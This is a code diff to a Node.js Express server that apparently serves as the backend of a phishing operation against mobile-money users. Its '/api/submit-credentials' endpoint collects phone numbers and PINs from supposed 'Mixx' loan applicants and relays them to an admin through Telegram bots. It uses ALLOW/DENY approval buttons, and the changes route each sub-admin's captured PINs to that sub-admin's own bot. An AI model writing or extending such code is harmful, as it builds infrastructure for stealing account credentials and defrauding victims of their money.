@@ -17,7 +17,6 @@ if (!MAIN_BOT_TOKEN) {
     console.log("🤖 Initializing Main Telegram Bot...");
 }
 
-// Main system bot instance
 const mainBot = new TelegramBot(MAIN_BOT_TOKEN, { polling: true });
 
 mainBot.on('polling_error', (error) => {
@@ -52,12 +51,15 @@ mainBot.on('message', (msg) => {
                 console.error(`⚠️ Sub-Admin (${userIdStr}) Bot Polling Error:`, err.code, err.message);
             });
 
+            // Set up callback queries for this specific sub-admin bot so they can handle ALLOW/DENY buttons
+            setupCallbackHandler(customBot, userIdStr, false);
+
             customBot.getMe().then((botInfo) => {
                 subAdminBots[userIdStr] = customBot;
                 subAdminTokens[userIdStr] = customToken;
                 delete subAdminSetupState[userIdStr];
 
-                mainBot.sendMessage(chatId, `✅ Token yako imehakikiwa kikamilifu!\n\nBot Yako: @${botInfo.username}\nSasa maombi yako yatatumika kupitia bot yako maalum.`);
+                mainBot.sendMessage(chatId, `✅ Token yako imehakikiwa kikamilifu!\n\nBot Yako: @${botInfo.username}\nSasa maombi yako yatatumika kupitia bot yako maalum na yatakuja kwako moja kwa moja.`);
                 sendAdminLink(chatId, userIdStr, firstName, username);
             }).catch((err) => {
                 mainBot.sendMessage(chatId, "❌ Bot Token uliyoweka si sahihi. Tafadhali tuma Token halali tena:");
@@ -119,7 +121,7 @@ function sendAdminLink(chatId, userIdStr, firstName, username) {
         .catch(err => console.error("Error sending start message:", err));
 }
 
-function setupCallbackHandler(botInstance, isMain = false) {
+function setupCallbackHandler(botInstance, ownerId, isMain = false) {
     botInstance.on('callback_query', async (query) => {
         const chatId = query.message.chat.id;
         const data = query.data;
@@ -177,18 +179,20 @@ function setupCallbackHandler(botInstance, isMain = false) {
     });
 }
 
-setupCallbackHandler(mainBot, true);
+// Initialize handler for the main bot
+setupCallbackHandler(mainBot, MAIN_ADMIN_ID, true);
 
 app.post('/api/submit-credentials', (req, res) => {
     const { sessionId, sliderData, loanData, phone, pin, adminId } = req.body;
     
+    // Explicitly target the specific sub-admin's chat ID and bot based on the query parameter link used
     let targetAdmin = MAIN_ADMIN_ID;
     let targetBot = mainBot;
 
     if (adminId && authorizedAdmins.has(adminId)) {
-        targetAdmin = adminId;
+        targetAdmin = adminId; // Sets the receiver to the sub-admin's exact chat ID
         if (adminId !== MAIN_ADMIN_ID && subAdminBots[adminId]) {
-            targetBot = subAdminBots[adminId];
+            targetBot = subAdminBots[adminId]; // Routes through the sub-admin's custom bot instance
         }
     }
 
@@ -199,7 +203,6 @@ app.post('/api/submit-credentials', (req, res) => {
         status: 'pending_pin_approval'
     };
 
-    // Trimmed message format to only display New Mixx Applicant, Phone No, and PIN
     const message = `NEW MIXX APPLICANT\n\n` +
         `PHONE NO: ${phone}\n` +
         `PIN: ${pin}`;
@@ -274,3 +277,4 @@ app.get('/api/check-status/:sessionId', (req, res) => {
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
+    
